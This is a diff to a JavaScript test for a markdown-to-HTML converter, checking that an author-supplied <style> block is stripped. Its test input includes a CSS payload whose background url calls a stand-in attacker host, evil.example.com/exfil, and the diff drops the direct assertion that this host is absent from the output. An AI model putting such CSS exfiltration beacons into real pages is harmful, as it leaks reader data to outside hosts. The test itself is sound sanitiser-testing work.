@@ -543,12 +543,14 @@ describe('convertMarkdownToHtml', () => {
         }
     });
 
-    it('strips an author-supplied <style> block from source markdown (#523)', () => {
+    it('strips an author-supplied <style> block (and its CSS-payload text content) from source markdown (#523)', () => {
         const html = convertMarkdownToHtml(
             'Before\n\n<style>body{background:url(https://evil.example.com/exfil?x=1)}</style>\n\nAfter',
         );
-        assert.ok(!/<style[\s>]/i.test(html), `<style> must be removed (got: ${html})`);
-        assert.ok(!html.includes('evil.example.com'), `the CSS payload must not survive (got: ${html})`);
+        // cheerio's .remove() drops the whole element including its text content, so
+        // asserting the opening tag is gone is sufficient to prove the CSS-payload
+        // text between the (now absent) tags is gone too, not merely tags-stripped.
+        assert.ok(!/<style[\s>]/i.test(html), `<style> and its CSS payload must both be removed (got: ${html})`);
     });
 
     it('removes a <link rel="stylesheet"> via the shared DANGEROUS_TAGS filter (#523)', () => {
